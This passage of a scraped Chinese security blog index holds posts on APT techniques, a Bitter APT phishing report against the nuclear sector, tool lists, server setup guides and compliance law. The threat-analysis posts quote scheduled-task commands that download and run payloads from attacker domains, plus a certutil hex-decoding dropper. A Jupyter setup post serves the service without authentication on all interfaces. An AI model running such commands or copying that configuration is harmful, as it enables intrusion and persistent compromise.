.jpeg, .jpg, .zip, .rar, .7z, .mp4, .sql, .php, .vbk, .vib, .vrb, .p7s та .sys, .dll, .exe, .bin, .dat) c2.使用合法程序 WinRAR 带有选项“-df”进行存档，该选项规定删除原始文件，随后删除创建的存档。 d.运行 Linux 的计算机的故障是使用 BASH 脚本执行的， d1.该脚本确保使用标准实用程序“dd”覆盖零字节的文件。 技术细节：WinRAR.exe a -df my.rar test.txt WinRAR 带有选项“-df”进行存档，该选项规定删除原始文件 SDelete.exe -r -s -q test.txt SDelete v2.04 https://learn.microsoft.com/zh-cn/sysinternals/downloads/sdelete SDelete 是一款安全的、不可恢复的删除文件和擦除剩余空间 的Windows 安全和实用工具 123456789# CMD写shell@echo offsetTEMPFILE HEX=&quot;!RANDOM!.hexset TEMPFILE EXE=&quot;!RANDOM!.exe- &gt;%TEMPFILE HEX% echo 4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 0 B8 00 00 00&gt;&gt;%TEMPFILE HEX% echo 00 00 00 00 40 0oo oo oo oo oo&gt;&gt;%TEMPFILE HEX% echo 2F A7 6B 32 4F DB 3E 30 68 F8 4C EF 67 EF F6 21 9B A1 7B 00&gt;&gt;%TEMPFILE HEX% echo 00 00 00 00- certutil -f -decodehex %TEMPFILE HEX% %TEMPFILE EXE%","tags":["APT"],"categories":["网络攻防"]},{"title":"GitHub最受欢迎100+开源安全项目","path":"/2023/05/08/github-top100-opensec/","content":"我是数字安全极客，持续分享安全干货，点点关注不迷路！","tags":["HackTool"],"categories":["网络攻防"]},{"title":"黑客的秘密武器100+顶级渗透神器汇总","path":"/2023/05/08/kali-top100-tools/","content":"黑客的秘密武器100顶级渗透神器汇总 Metasploit：世界领先的渗透测试工具，拥有强大的漏洞利用库和自定义脚本功能，助您迅速发现并利用目标系统的安全漏洞。 Burp Suite：专业的Web应用程序渗透测试平台，提供代理、扫描和攻击等功能，帮助您检测和利用Web应用程序中的漏洞。 Aircrack-ng：用于无线网络渗透测试的完整套件，包括无线网卡驱动程序、嗅探器和WEP&#x2F;WPA破解工具，可实现WiFi网络的渗透和安全审计。 John the Ripper：强大的密码破解工具，支持多种加密算法，可用于恢复失去的密码或评估弱密码的安全性。 Hydra：快速且灵活的登录破解工具，支持多种协议和服务，可用于暴力破解密码或进行在线身份验证测试。 Nikto：开源的Web服务器扫描工具，能够识别常见的安全风险和漏洞，帮助您评估Web应用程序的安全性。 SQLMap：专为SQL注入攻击设计的自动化工具，可检测和利用Web应用程序中的SQL注入漏洞，从而获取数据库敏感信息。 Wireshark：最受欢迎的网络协议分析工具，可实时捕获和分析网络流量，帮助您深入了解网络通信并发现潜在的安全问题。 Maltego：强大的开源情报收集和数据分析工具，可在互联网上收集和分析各种信息，并帮助您构建威胁情报画像。 Social Engineer Toolkit（SET）：专为社会工程学攻击设计的框架，提供多种伪装和钓鱼攻击模块，可用于测试人员的安全意识和训练。 #Kali #网络安全 #渗透测试 #黑客工具 #漏洞扫描 #密码破解 #社会工程学","tags":["HackTool"],"categories":["网络攻防"]},{"title":"针对中国核能行业的网络钓鱼活动","path":"/2023/03/24/apt/apt-2023-03-24/","content":"亮点：这篇报告中整个攻击流程非常清晰，具体的攻击手法都给出了示例，在钓鱼邮件的细节处理、还有一些防御规避措施都是值得注意的。最后的持久化都落地在计划任务，所以在防守时，重点关注计划任务中可疑的项目，文章后面我给出了具体排查的命令。 一、背景被认为来自南亚的黑客组织 Bitter APT 最近正以中国核能机构为攻击目标。安全公司 Intezer 报告，在最近的行动中，Bitter APT 伪装成吉尔吉斯斯坦驻北京大使馆向中国核能公司和该领域的学者发送钓鱼邮件，邀请他们参加吉尔吉斯斯坦大使馆等主办的一个核能会议。邮件签名者是真实存在的，是吉尔吉斯斯坦外交部的一名官员。但邮件附件是恶意的，会执行一系列行动释放恶意负荷。 二、攻击技术细节 恶意微软 Excel 文件，每 15 分钟运行一次计划任务，使用 cURL 下载恶意程序。 1&quot;C:\\Windows\\System32\\schtasks.exe&quot; /create /sc MINUTE /mo 15 /TN \\Windows\\DWM\\DWMCORE /TR &quot;cmd /c start /min curl --output %AppData%\\dwmcor.exe -O &quot;&quot;https://qwavemediaservice[.]net/hkcu/qt.php/?dt=%computername%-QT-2&amp;ct=QT&quot;&quot;&quot; /f 恶意微软 Excel 文件，每 20 分钟运行另一个计划任务，执行上一步下载的恶意程序。 1&quot;C:\\Windows\\System32\\schtasks.exe&quot; /create /sc MINUTE /mo 20 /TN \\Windows\\DWM\\DWMCORELIB /TR &quot;%AppData%\\dwmcor.exe&quot; /f CHM 文件，创建一个计划任务。（通过分解字符串以进行模糊处理） 1&quot;C:\\Windows\\System32\\schtasks.exe&quot; /create /sc minute /mo 15 /tn AdobeUpdater /tr &quot;%coMSPec% /c s^t^a^rt /^m^i^n m^s^i^e^xe^c ^/^i htt^p:/^/mirz^adih^atti^[.]com^/cs^s/t^ry.php?h=%computername%*%username% /^q^n ^/^norestart&quot; /ft CHM 文件，创建的另一个计划任务 12,cmd.exe, /c start /min powershell -e xxxxschtasks /create /tn WinSecurity /sc minute /mo 15 /tr &quot;powershell.exe -WindowStyle Hidden -command curl -o %LOCALAPPDATA%\\pic.jpg https://coauthcn[.]com/hbz.php?id=%computername%;timeout 9;more %LOCALAPPDATA%\\pic.jpg|powershell;timeout 9;del %LOCALAPPDATA%\\pic.jpg&quot; /f 三、防守要点上述所有操作，最终都是创建了计划任务进行持久化，所以通过查看计划任务的执行的命令操作，可以看到可疑的执行命令。具体排查命令如下： 使用 PowerShell 分析定位可疑的计划任务123Get-ScheduledTask | Format-Table -AutoSize(Get-ScheduledTask -TaskName DWMCORELIB).Actions | Format-List *(Get-ScheduledTask).Actions | Format-List Execute 使用 CMD 分析定位可疑的计划任务12schtasks.exe /Query /V /FO LIST （输出格式：TABLE、LIST、CSV。）taskschd.msc （图形界面） 四、附加知识点** %comspec% 是什么？**打开一个命令行窗口。%comspec% 是一个指向当前命令行外壳的环境变量。通过使用 %comspec%，您不必担心命令行外壳是 cmd.exe 还是 command.exe；%comspec% 会自动选择正确的一个。 ** PowerShell Base64 编码 ** 12345678// Base64 编码$commond =&quot;write-host &#x27;testmsg&#x27;&quot;$bytes = [System.Text.Encoding]::Unicode.GetBytes($commond)$encodeCommand = [Convert]::ToBase64String($bytes)write-host &#x27;StringToBase64: &#x27; $encodeCommand// Base64 解码$DecodeText=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encodeCommand))write-host &#x27;Base64ToString: &#x27; $DecodeText 感兴趣的朋友加我好友，一起学习交流！~ 报告原文：https://intezer.com/blog/research/phishing-campaign-targets-nuclear-energy-industry/","tags":["APT"],"categories":["网络攻防"]},{"title":"办公生产力效率工具合集","path":"/2023/03/10/productivity-tools/","content":"浏览器插件 WeTab 标签页插件 Wetab 是一款可以亲手打造属于自己的高颜值主页的小组件新标签页插件。 Ublock 去除广告 ublock 免除优酷，腾讯，爱奇艺，YouTube视频广告 Workona 大量标签页管理 这款插件可以帮助我在不同的工作区组织多个Tab。 Web for TikTok Web for TikTok 刷海外版抖音TikTok，下载Tiktok短视频 RSSHub Radar 快速发现和订阅当前网站 RSS 和 RSSHub 的浏览器扩展 万物皆可 RSS AI 助手 名称 功能 AIshort.top 提示词助手 Looka.com Logo 设计助手 ChatPDF.com PDF 阅读分析助手 myGPTReader AI 阅读助手(支持多种类型文档) Copy.ai 辅助编写商业市场营销文案 Copyai.cn 文案种类做很多 在线翻译 DeepL https://www.deepl.com/ 沉浸式浏览器翻译插件 https://immersive-translate.owenyoung.com/ Saladict 聚合词典, 并行翻译 Saladict 科大讯飞文档翻译 https://fanyi.xfyun.cn/console/trans/doc 福昕翻译 https://fanyi.pdf365.cn/doc 知云文献 http://www.zhiyunwenxian.cn 搜狗翻译 https://fanyi.sogou.com/document 听力口语 语言交流App https://zh.hinative.com/ Myshell.ai 一款可以和虚拟人语音聊天的网页工具 https://myshell.ai IELTS speaking test IELTS speaking test. Qwerty Learner 单词记忆与英语肌肉记忆锻炼软件 https://qwerty.kaiyi.cool 绘图工具 Draw.io https://github.com/jgraph/drawio-desktop Asciiflow 免费在线绘制ASCII风格图 https://asciiflow.com/ PlantUML 支持文本绘制类UML图的工具 https://plantuml.com/zh/ Mermaid 原生支持Web，无需通过生成图片即可集成到网站页面 https://github.com/mermaid-js/mermaid 白板工具 Excalidraw https://excalidraw.com/ Excalidraw is a virtual collaborative whiteboard tool that lets you easily sketch diagrams that have a hand-drawn feel to them. Whimsical https://whimsical.com/ Whimsical brings together four powerful formats in a unified hub for collaboration. 好用的在线工具集 https://tool.browser.qq.com/ PDF24 Tools: 免费且易于使用的在线PDF工具 无需上传文件也可在线处理图片 (imagestool.com) 其他工具 寻找替代软件的网站：AlternativeTo 世界最大开源及开放数据图书馆：安娜的档案 (annas-archive.org)","tags":["Mkdocs","Program"],"categories":["程序编程"]},{"title":"寻找适合自己的博客笔记系统","path":"/2023/03/09/how-to-blog/","content":"寻找适合自己的博客笔记系统背景搭建自己个人博客，尝试多个博客系统，我想在博客中表达的内容类型比较多，总是不能完全满足需求，最后选择这个组合Hexo-Stellar是我最喜欢的，基本不用修改太多配置，阅读使用注意力很集中。安装过程记录一下，便于快速部署。 每个人的需求不同，博客或笔记工具选择也不同，可以自行尝试，找到最适合的。 Docusaurus GitBook MkDocs Docsify vuepress Hego Hexo Wordpress Hexo 系统Hexo 官网帮助文档：快速上手 Hexo 安装12$ npm install -g hexo-cli$ npx hexo &lt;command&gt; Hexo 新建与运行项目安装 Hexo 完成后，请执行下列命令，Hexo 将会在指定文件夹中新建所需要的文件。 1234$ hexo init &lt;folder&gt;$ cd &lt;folder&gt;$ npm install$ hexo s Hexo 安装插件安装主题插件 1234567$ npm i hexo-theme-stellar# Edit your _config.yml:&gt; theme: stellarInstall Stellar in terminal:$ npm i hexo-theme-stellar 安装部署插件 123456789101112# 先找到 myblog/_config.yml 文件，在其中设置：deploy: - type: git repo: https://github.com/username/username.github.io.git # 注意要把地址改为自己的仓库地址 branch: gh-pages message: &quot;Build at &#123;&#123; now(&#x27;YYYY-MM-DD HH:mm:ss Z&#x27;) &#125;&#125;&quot;# 这个指令用来安装插件npm i hexo-deployer-git# 此插件可以将博客部署到 git 仓库中hexo clean &amp;&amp; hexo g &amp;&amp; hexo d MkDocs 系统Material for MkDocs 官网帮助文档：快速上手 MkDocs 基础操作123456$ pip install mkdocs-material$ mkdocs new [dir-name] - Create a new project.$ mkdocs serve - Start the live-reloading docs server.$ mkdocs build - Build the documentation site.$ mkdocs -h - Print help message and exit. Mkdocs 配置123456# Mkdocs Blog 插件 https://liang2kl.github.io/mkdocs-blogging-plugin/$ pip install mkdocs-blogging-plugin# 配置参考https://github.com/gledos/ggame/blob/master/mkdocs.ymlhttps://segmentfault.com/a/1190000018592279 Docusaurus 系统Docusaurus 官网帮助文档： 开始上手 Docusaurus 安装123$ npx create-docusaurus@latest my-website classic$ cd my-website $ npx docusaurus start Docusaurus 运行123npm run buildnpm run servenpm run serve -- --build --port 3001 --host 0.0.0.0 Linux 安装 NodeJS 脚本123456789$ wget https://nodejs.org/dist/v16.15.0/node-v16.15.0-linux-x64.tar.xz$ tar -xJvf node-v16.15.0-linux-x64.tar.xz -C /usr/local/lib/nodejs $ vi ~/.profile export PATH=//usr/local/lib/nodejs/node-v16.15.0-linux-x64/bin:$PATH$ source ~/.profile$ node -v $ npm version $ npx -v","tags":["Mkdocs","Program"],"categories":["程序编程"]},{"title":"Hello World","path":"/2023/03/08/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment"},{"title":"看懂网络安全、数据保护和隐私保护的关系","path":"/2023/01/11/security-architecture/cybersec-datasec/","content":"网络安全和数据安全的关系网络安全和数据安全的关系，网络安全是从外向内，建立层层防线防止边界内的资产被侵害（例如：城堡与护城河）；数据安全是从内向外，对内部资产分类分级确定关键核心资产后建立层层防线（例如：保险柜）。 数据保护和隐私保护的关系数据安全是指保护各类数据免受未经授权的访问、修改、披露、删除或毁坏的措施。 国家秘密数据保护: 国家秘密数据包括国家战略、外交、经济等敏感信息。保护国家秘密数据, 政府通常采取严格的安全措施和管理流程。 军事数据保护: 军事数据通常涉及军事战略、战术、装备、和其他机密信息。保护军事数据需要严格的安全管理流程和措施。 商业数据保护: 商业数据通常包括商业秘密、客户信息、财务数据等。保护企业数据的目的是保护公司的商业利益。 行业数据保护: 每个行业都有自己的数据保护要求, 例如金融行业有严格的客户信息保护要求，医疗行业有严格的病人信息保护要求等。保护行业数据的目的是保护行业的合法权益和遵循相关法律法规。 个人信息保护: 个人信息保护是指保护个人隐私权益, 包括个人基本信息、身份证明、个人财产信息、交易信息等。保护个人信息的目的是维护个人隐私权益和遵循相关法律法规。 隐私保护是指是指对个人主体隐私权的保护。个人隐私权益受到法律法规的保护。 《民法典》隐私是自然人的私人生活安宁和不愿为他人知晓的私密空间、私密活动、私密信息。 个人隐私权是指个人对于自己的个人信息和生活私密和对不愿为他人知晓的私密空间、私密活动和私密信息等进行支配和控制，任何组织或者个人不得以刺探、侵扰、泄露、公开等方式侵害。 保护个人主体信息不被泄露或滥用 个人主体有权知道自己的个人信息在哪里被使用, 以及如何被使用 个人主体有权对自己的个人信息进行修改和删除 保证个人信息只在合法的范围内使用 个人主体应该有权选择是否提供自己的个人信息 GDPR 对隐私保护的要求GDPR（General Data Protection Regulation）全称《一般数据保护条例》，是欧盟2016年4月27日通过的一项新的数据保护法规，并于2018年5月25日生效。它是欧盟迄今为止最严格的数据保护法，覆盖所有欧盟成员国，以及处理欧盟公民个人数据的公司和组织。 GDPR 的目的是通过一系列条款和条件来提高个人数据保护水平，提高公司和组织对个人数据的责任，并确保个人对自己的个人数据拥有更大的控制权。另外 GDPR 为了给个人更多的控制权，让个人可以更好的知道自己的个人数据在哪里使用和如何使用，也让个人更容易的访问，修改或删除自己的个人数据。 GDPR 主要规定如下： 数据主体的同意必须是自愿的，明确并特定的. 数据主据主体有权知道自己的个人数据在哪里被使用, 以及如何被使用. 数据主体有权对自己的个人数据进行修改和删除. 企业和组织需要指定一位数据保护官(DPO), 负责遵循 GDPR 的要求. 当个人数据遭到滥用或泄露时，企业和组织需要在72小时内通知主管机关. 企业和组织需要对自己的合规性进行自我评估并准备合规性报告. 为了实现这一目标，GDPR规定了企业和组织在处理个人数据时必须遵循的一系列原则和要求，如数据合法性、透明性、最小化数据、同意性、合规性等，并为个人数据保护提供了严格的法律框架。","tags":["网络安全","数据安全","隐私保护"],"categories":["安全体系"]},{"title":"Minio快速安装记录","path":"/2022/09/03/minio/","content":"Minio安装过程： 12345678910111213141516171819202122wget https://dl.min.io/server/minio/release/linux-amd64/archive/minio_20241002175041.0.0_amd64.deb -O minio.debdpkg -i minio.deb# 手动调试export MINIO_ROOT_USER=user; export MINIO_ROOT_PASSWORD=passwrod; minio server ~/minio_dir --console-address 0.0.0.0:9001# 服务配置systemctl start miniosystemctl enable minio# Minio 配置文件vi /etc/default/minioMINIO_ROOT_USER=rootMINIO_ROOT_PASSWORD=rootpasswordMINIO_VOLUMES=/home/admin/minioMINIO_OPTS=&quot;--console-address 0.0.0.0:9001&quot;# Minio 服务配置 注意修改运行权限vi /lib/systemd/system/minio.serviceUser=adminGroup=admin 这个配置文件很清晰，值得学习敷用 cat &#x2F;lib&#x2F;systemd&#x2F;system&#x2F;minio.service 12345678910111213141516171819202122232425262728293031323334353637383940[Unit]Description=MinIODocumentation=https://docs.min.ioWants=network-online.targetAfter=network-online.targetAssertFileIsExecutable=/usr/local/bin/minio[Service]Type=notifyWorkingDirectory=/usr/localUser=adminGroup=adminProtectProc=invisibleEnvironmentFile=-/etc/default/minioExecStart=/usr/local/bin/minio server $MINIO_OPTS $MINIO_VOLUMES# Let systemd restart this service alwaysRestart=always# Specifies the maximum file descriptor number that can be opened by this processLimitNOFILE=1048576# Turn-off memory accounting by systemd, which is buggy.MemoryAccounting=no# Specifies the maximum number of threads this process can createTasksMax=infinity# Disable timeout logic and wait until process is stoppedTimeoutSec=infinitySendSIGKILL=no[Install]WantedBy=multi-user.target# Built for $&#123;project.name&#125;-$&#123;project.version&#125; ($&#123;project.name&#125;)","tags":["网络存储"],"categories":["基础工具"]},{"title":"Jupyter Lab 作为 systemd 服务运行","path":"/2022/09/02/jupyterlab/","content":"如果要在任何 Linux 发行版上将 Jupyter Lab 作为网络服务运行，可以安装运行 Jupyter 的服务。首先，您需要使用systemd jupyter lab 1sudo pip3 install jupyterlab 如果您的没有 pip3 执行 sudo apt -y install python3-pip 请注意，此脚本将在没有令牌身份验证和密码的情况下运行 Jupyter，并且默认情况下它将侦听任何 IP （） 。更改命令行标志或注意安全隐患！--ip=0.0.0.0 1234567891011121314151617181920212223242526#!/bin/bash# This script installs and enables/starts a systemd serviceexport NAME=Jupyter# Create service filecat &gt;/etc/systemd/system/$&#123;NAME&#125;.service &lt;&lt;EOF[Unit]Description=$&#123;NAME&#125;[Service]Type=simpleExecStart=/usr/bin/env jupyter lab --ip=0.0.0.0 --port 17256 --LabApp.token=&#x27;&#x27;WorkingDirectory=/home/uli/jupyterUser=uliGroup=uliRestart=on-failureRestartSec=5s[Install]WantedBy=multi-user.targetEOF# Enable and start servicesystemctl enable --now $&#123;NAME&#125; 您需要更改脚本中的以下条目，以使其为您工作： 123WorkingDirectory=/home/uli/jupyterUser=uliGroup=uli 将 设置为 您希望 Jupyter 运行的任何目录。请注意，任何能够访问 Web 界面的人基本上都拥有对该目录的完全访问权限！ WorkingDirectory set 和 设置为应运行的用户。请注意，不允许以 root 身份运行 Jupyter。如果您仍想这样做，请将标志添加到 命令行选项中。 User Group --allow-root 现在运行脚本以安装服务：root 1sudo ./install-jupyter-service.sh 现在，您可以在 访问 Jupyter。http://[ip of the computer]:17256 更改配置为了更改配置，我建议直接编辑（或者如果您更改了）。之后，运行 /etc/systemd/systemd/Jupyter.service /etc/systemd/systemd/$&#123;NAME&#125;.service export NAME=Jupyter 12sudo systemctl daemon-reloadsudo systemctl restart Jupyter 您也可以更改安装脚本并重新运行它，但您仍然需要运行 和 .daemon-reload``restart 运行多个 Jupyter 实例为了运行多个实例，只需运行具有不同名称的安装脚本的多个副本。例如，使用 1export NAME=Jupyter-DeepLearning 调试 Jupyter Lab 输出如果您在启动 Juypter Lab 时遇到问题，请使用 1sudo systemctl status Jupyter 要查看状态和 1sudo journalctl -xfu Jupyter 以查看所有日志。 状态输出示例： 12345678910111213141516171819● Jupyter.service - Jupyter Loaded: loaded (/etc/systemd/system/Jupyter.service; enabled; vendor preset: enabled) Active: active (running) since Fri 2021-06-11 03:44:28 CEST; 4s ago Main PID: 48753 (jupyter-lab) Tasks: 1 (limit: 14226) Memory: 51.7M CGroup: /system.slice/Jupyter.service └─48753 /usr/bin/python3 /usr/local/bin/jupyter-lab --ip=0.0.0.0 --port 17256 --LabApp.token=Jun 11 03:44:29 uli-desktop env[48753]: [I 2021-06-11 03:44:29.215 ServerApp] nbclassic | extension was successfully loaded.Jun 11 03:44:29 uli-desktop env[48753]: [I 2021-06-11 03:44:29.216 LabApp] JupyterLab extension loaded from /usr/local/lib/python3.8/dist-packages/jupyterlabJun 11 03:44:29 uli-desktop env[48753]: [I 2021-06-11 03:44:29.216 LabApp] JupyterLab application directory is /usr/local/share/jupyter/labJun 11 03:44:29 uli-desktop env[48753]: [I 2021-06-11 03:44:29.219 ServerApp] jupyterlab | extension was successfully loaded.Jun 11 03:44:29 uli-desktop env[48753]: [I 2021-06-11 03:44:29.220 ServerApp] Serving notebooks from local directory: /dev/shmJun 11 03:44:29 uli-desktop env[48753]: [I 2021-06-11 03:44:29.220 ServerApp] Jupyter Server 1.8.0 is running at:Jun 11 03:44:29 uli-desktop env[48753]: [I 2021-06-11 03:44:29.220 ServerApp] http://uli-desktop:17256/labJun 11 03:44:29 uli-desktop env[48753]: [I 2021-06-11 03:44:29.220 ServerApp] http://127.0.0.1:17256/labJun 11 03:44:29 uli-desktop env[48753]: [I 2021-06-11 03:44:29.220 ServerApp] Use Control-C to stop this server and shut down all kernels (twice to skip confirmation).Jun 11 03:44:29 uli-desktop env[48753]: [W 2021-06-11 03:44:29.224 ServerApp] No web browser found: could not locate runnable browser. 卸载 Jupyter Lab 服务为了仅停止和禁用自动启动（但不卸载）Jupyter Lab 服务，请使用 1sudo systemctl disable --now Jupyter 之后，您只需删除服务文件即可永久卸载该服务： 1sudo rm /etc/systemd/system/Jupyter.service 您始终可以使用我们的安装脚本重新安装。 请注意，如果您更改了行，则需要替换为export NAME=...``Jupyter``Name","tags":["jupyter","Jupyter Lab"],"categories":["基础工具"]},{"title":"一键安装Dante建立socks5代理","path":"/2022/09/01/dante-socks5/","content":"下载一键安装脚本 1$ curl -o socks5.sh https://raw.githubusercontent.com/Lozy/danted/refs/heads/master/install.sh 安装 Dante 12$ sudo chmod +x socks5.sh$ ./socks5.sh --port=端口 --user=用户名 --passwd=密码 启动 Dante socks5 代理服务器并加入开机启动 12$ sudo service sockd start$ sudo systemctl enable sockd 代理测试 123curl -v --socks5 1.2.3.4:80 --proxy-user name:pass http://abc.comcurl -x socks5://username:password@proxy_server_ip:1080 https://ifconfig.mecurl -x socks5://username:password@proxy_server_ip:1080 https://ipinfo.io","tags":["网络代理"],"categories":["基础工具"]},{"title":"一文全览 信息安全合规认证法律法规","path":"/2022/05/11/security-architecture/compliance/","content":"安全合规认证ISO&#x2F;IEC 27001ISO&#x2F;IEC 27001是目前国际上被广泛接受和应用的信息安全管理体系认证标准。该标准以风险管理为核心，通过定期评估风险和对应的控制措施来有效保障组织信息安全管理体系的持续运行。获得ISO&#x2F;IEC 27001认证证书，表明能够提供一个符合国际公认信息安全标准的云环境。 PDF下载：ISO27001 遵从性指南 PCI DSSPCI DSS全称Payment Card Industry Data Security Standard，即支付卡行业数据安全标准，ISA、JCB和万事达等五家国际信用卡组织共同建立的一套支付卡行业数据安全标准，致力于保护持卡人的数据安全。世界上最权威、最严格的金融机构认证。 PCI DSS包含建立并维护安全的网络和系统、保护帐户数据、维护漏洞管理计划、实施强效访问控制措施、定期监控并测试网络、维护信息安全政策这六大领域内容，具体囊括12项具体安全标准要求，为保护持卡人数据及敏感验证数据的技术和操作提供基准。 PDF下载：PCI DSS 实践指南 CSA STARCSA——Cloud Security Alliance，云安全联盟作为业界权威组织，致力于在云计算环境下为业界提供最佳安全解决方案。 CSA STAR认证是由英国标准协会(BSI)和云安全联盟（CSA）联合推出的国际范围内的针对云安全水平的权威认证，旨在应对与云安全相关的特定问题。CSA STAR以ISO&#x2F;IEC 27001认证为基础，结合云端安全控制矩阵CCM的要求，运用BSI提供的成熟度模型和评估方法，综合评估组织云端安全管理和技术能力。 2021年CSA推出CCM V4新标准，CCM V4包括17个控制域和197个控制目标，对CCM V3.0.1内容做了大幅更新，覆盖来自云计算新技术、新控制、安全责任矩阵的要求，改善控制项的问责制，增强互操作性及与其它标准的兼容性，涵盖了云计算技术的安全领域。 PDF下载：CSA CCM 遵从性指南 NISTNIST CSF，是由美国国家标准与技术研究所（National Institute of Standards and Technology，简称NIST）制定的网络安全框架（Cybersecurity Framework，简称CSF），旨在为寻求加强网络安全防御的组织提供指导，目前已成为全球认可的权威安全评估体系。 NIST CSF由标准、指南和管理网络安全相关风险的最佳实践三部分组成，其核心内容可以概括为经典的IPDRR能力模型，即风险识别能力（Identify）、安全防御能力（Protect）、安全检测能力（Detect）、安全响应能力（Response）和安全恢复能力（Recovery）五大能力。这个能力框架实现了网络安全“事前、事中、事后”的全过程覆盖，帮助企业主动识别、预防、发现、响应安全风险。 PDF下载：NIST CSF 实践指南 HIPAA美国《健康保险流通与责任法案》（HIPAA）于1996年颁布。该法案涵盖一系列保障 PHI（受保护健康信息）的安全性和隐私性的控制要求，以加强信息共享并提高医疗保 健系统的效率和质量。 PDF下载：HIPAA 遵从性指南 PDPA新加坡于2012年10月15日颁布了《个人数据保护法 2012》（PDPA），该法于2014年7月2日生效。新加坡PDPA整体规范了组织对个人数据的收集、使用和披露， 保障个人对其个人数据保护的权利并承认组织出于合理的目的收集、使用和披露个人数据的需要。 PDF下载：新加坡 PDPA 遵从性指南 网络安全实践指南基础设施安全是构筑多维全栈安全防护体系的核心组成部分。参考业界最佳实践在数据中心、网络等基础设施的设计和管理上充分考虑安全性与合规性。 PDF下载：网络安全白皮书 数据安全实践指南需要高度重数据资产，把数据保护作为安全策略的核心。遵循数据安全生命周期管理的业界先进标准，在身份认证、权限管理、访问控制、数据隔离、传输安全、存储安全、数据删除、物理销毁等方面，采用优秀技术、实践和流程，建立切实有效的数据保护能力。 PDF下载：数据安全白皮书 法律法规及监管要求网络安全法《网络安全法》规定，导致危害网络安全等后果的，责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员进行处罚。 中华人民共和国网络安全法-中共中央网络安全和信息化委员会办公室 (cac.gov.cn) 中华人民共和国网络安全法中国政府网 (www.gov.cn) 数据安全法《数据安全法》规定，未履行数据安全保护义务的， 责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员进行处罚。 中华人民共和国数据安全法_中国人大网 (npc.gov.cn) 中华人民共和国数据安全法_中国政府网 (www.gov.cn) 个人信息保护法《个人信息保护法》规定，企业需要设置个人信息保护负责人，对个人信息处理风险进行事先评估和防控，最高罚款5000万元或上一年度营业额5%，直接负责的主管和直接责任人进行处罚。 中华人民共和国个人信息保护法_中国人大网 (npc.gov.cn) 中华人民共和国个人信息保护法_中国政府网 (www.gov.cn) 网络安全等级保护网络安全等级保护（简称等保）是公安部用于指导国内各组织单位进行网络安全建设的依据，目前已成为各行业广泛遵循的通用安全标准。 等保等级由低到高分为五级，主要依据系统受破坏后危害的范围和严重程度。目前1级系统因影响小，基本不需备案；5级系统目前还不存在，只是理想状态。这里主要介绍2-4级： • 2级，受到破坏，会对公民、法人和其他组织的合法权益产生严重损害，或者对社会秩序和公共利益造成损害，但不损害国家安全。需国家信息安全监管部门对该级信息系统信息安全等保工作进行指导。 • 3级，受到破坏，会对社会秩序和公共利益造成严重损害，或者对国家安全造成损害。需国家监管部门进行监督、检查。 • 4级，受到破坏，会对社会秩序和公共利益造成特别严重损害，或者对国家安全造成严重损害。需国家监管部门进行强制监督、检查。 信息安全技术 网络安全等级保护基本要求 信息安全技术 网络安全等级保护测评要求 信息安全技术 网络安全等级保护安全设计技术要求) 网络安全保护义务2017年6月1日，《网络安全法》正式施行，明确了网络使用者和运营者的权利和责任。 2021年9月1日，《中华人民共和国数据安全法》、《关键信息基础设施安全保护条例》正式施行； 2021年11月1日，《中华人民共和国个人信息保护法》正式实施。 国家实行网络安全等级保护制度。网络运营者应当按照网络安全等级保护制度的要求，履行下列安全保护义务，保障网络免受干扰、破坏或者未经授权的访问，防止网络数据泄露或者被窃取、篡改。 等级保护制度要求，网络运营者设置专门安全管理机构和负责人，落实网络安全防护措施、保护重要数据。 违反《网络安全法》规定，导致危害网络安全等后果的, 责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员进行罚款。 执法案例淘宝网、BOSS直聘，因为合规问题，受到行政处罚。蘑菇街、虾米音乐，因为不合规问题，受到暂停业务、暂停用户注册的处罚。淘宝网，部分店铺存在售卖破坏计算机信息系统工具、售卖违禁管制物品、贩卖非法VPN工具、贩卖网络账号，对淘宝网提出警告并责令其改正； BOSS直聘，BOSS直聘在为用户提供信息发布服务过程中，违规为未提供真实身份信息的用户提供了信息发布服务；未采取有效措施对用户发布传输的信息进行严格管理，导致违法违规信息扩散。东北大学毕业生李某在 BOSS直聘遭遇招聘诈骗、深陷传销组织致死事件引发社会广泛关注。经调查，北京市网信办相关负责人表示，BOSS直聘的上述问题已违反《中华人民共和国网络安全法》第24条、第48条规定 ，要求该网站整改网站招聘信息。 同花顺金融网，责令开展专项检查，暂停相关业务，追究有关人员责任； 豆瓣网、蘑菇街互动网、虾米音乐网，暂停新用户注册７天。 沃尔玛，网络系统存在可利用的网络安全漏洞共十九项，未及时处置系统漏洞。违反了《中华人民共和国网络安全法》第二十五条、第五十九条第一款之规定，处罚结果为决定给予警告的行政处罚，并责令改正。 网络安全法执法案例汇总 2020年网络安全等级保护执法典型案例汇总 2021年网络安全典型执法案例 刑法 非法侵入计算机信息系统罪 - 1台 （国家事务、国防建设、尖端科学技术领域） 非法控制计算机信息系统罪 - 20台 非法获取计算机信息系统数据罪 - 违法数据条目数量：个人 500、政务 100、其他 2000条 破坏计算机信息系统罪 - 10台删除 20台修改 非法利用信息网络罪 - 违法所得五千元以上 帮助信息网络犯罪活动罪 - 违法所得五千元以上 《中华人民共和国刑法》其任务是用刑罚以保卫国家安全，保卫人民民主专政的政权和社会主义制度，保护公私财产，保护公民的权利，维护社会秩序，保障社会主义建设事业的顺利进行。违反刑法的行为是为犯罪。在2015年《刑法修正案（九）》公布后，第二百八十五条至第二百八十七条，共列七种犯罪。 第二百八十五条 【非法侵入计算机信息系统罪】违反国家规定，侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的，处三年以下有期徒刑或者拘役。 